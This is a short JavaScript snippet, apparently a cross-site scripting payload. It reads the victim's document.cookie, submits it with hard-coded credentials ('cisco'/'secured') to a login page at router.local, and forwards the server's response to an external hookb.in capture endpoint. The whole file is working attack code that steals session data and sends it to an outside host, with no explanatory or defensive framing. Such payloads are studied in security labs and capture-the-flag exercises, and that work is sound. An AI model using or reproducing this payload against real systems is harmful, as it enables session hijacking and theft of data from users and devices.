const http = new XMLHttpRequest();
http.open('POST', 'http://router.local/login.php', true);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
    //if (http.readyState === http.DONE) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://hookb.in/YV0RexmZ9NsQERGGd0gN', true);
        xhr.setRequestHeader('Content-type', 'application/json');
        xhr.send(JSON.stringify(http.responseText));
        
     //}
};
const cook = document.cookie;
http.send("PHPSESSID="+cook+"&username=cisco&pin=secured&notRobot=on");
   

